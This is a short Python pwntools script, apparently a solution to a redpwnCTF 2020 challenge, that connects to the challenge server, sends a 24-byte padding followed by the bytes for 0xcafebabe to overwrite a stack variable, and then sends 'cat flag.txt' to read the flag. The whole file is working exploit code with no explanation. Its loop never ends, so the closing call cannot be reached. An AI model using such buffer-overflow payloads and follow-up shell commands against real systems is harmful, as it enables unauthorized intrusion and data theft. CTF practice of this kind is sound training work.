from pwn import *

conn = remote('2020.redpwnc.tf', 31255)
while True:
	p = conn.recvline()
	print(p)
	p = conn.recvline()
	print(p)
	conn.sendline('a'*24 + '\xbe\xba\xfe\xca')
	conn.sendline('cat flag.txt')
	
conn.close()
